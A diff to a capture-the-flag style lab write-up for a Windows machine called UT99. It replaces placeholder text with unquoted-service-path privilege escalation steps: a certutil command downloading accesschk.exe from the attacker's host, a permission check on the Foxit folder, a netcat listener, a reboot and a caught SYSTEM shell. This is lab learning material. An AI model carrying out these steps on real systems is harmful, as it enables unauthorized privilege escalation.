@@ -3,7 +3,7 @@ Alias: UT99
 Date: 8/2/2022
 Platform: Windows
 Difficulty: Intermediate
-Tags: #UnqoutedServicePath #PrivilegeEscalation 
+Tags: #UnqoutedServicePath #PrivilegeEscalation #accesschkbinary
 Status: Finished
 IP: 192.168.114.44
 ---
@@ -21,7 +21,7 @@ IP: 192.168.114.44
 
 ## Used tools
 - nmap
-- gobuster
+- rustscan
 
 ---
 
@@ -586,8 +586,24 @@ Enumerated top 200 UDP ports:
 
 ![](../Images/Pasted%20image%2020220708005834.png)
 
-
 ## Privilege Escalation vector
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
 
+#### - Typed "certutil.exe -urlcache -split -f "http://[Kali IP]:84/accesschk.exe" on target machine to download the accesschk binary
+
+![](../Images/Pasted%20image%2020220708010418.png)
+#accesschkbinary
+
+#### - Typed ".\accesschk /accepteula -uwdq "C:\Program Files (x86)\Foxit Software"" and confirmed we have read and write access to C:\Program Files (x86)\Foxit Software:
+
+![](../Images/Pasted%20image%2020220708010727.png)
+
+#### - Started a netcat listener on my kali machine listening on port 30336
+
+#### - Typed "shutdown -r -t 10 && exit" to restart the target machine
+
+![](../Images/Pasted%20image%2020220708010901.png)
+
+#### - Waited a little while for the target machine to restart and received a nt authority\system shell:
+
+![](../Images/Pasted%20image%2020220708011127.png)
 ---
